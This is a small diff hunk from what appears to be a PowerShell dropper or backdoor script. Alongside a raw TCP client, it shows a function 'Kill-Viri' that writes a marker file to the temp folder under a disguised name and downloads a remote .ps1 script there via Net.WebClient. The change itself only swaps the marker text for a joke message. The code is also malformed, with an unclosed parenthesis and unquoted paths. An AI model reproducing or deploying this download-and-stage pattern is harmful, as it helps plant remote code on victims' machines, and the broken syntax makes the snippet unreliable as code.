@@ -457,7 +457,10 @@ $TcpConnection = New-Object System.Net.Sockets.TcpClient
 }
 
 function Kill-Viri {
-echo "=====The World Wireless~=====" > $env:temp/powermng.dat
+$dirz = $env:temp/powermng.dat
+echo "============AS=============" > $dirz
+echo "No loitering or banking please" >> $dirz
+echo "Thank you. ~Adult Swim" >> $dirz
 (Net.WebClient).DownloadFile(Get-Link, $env:temp/powermng.ps1
 }
 
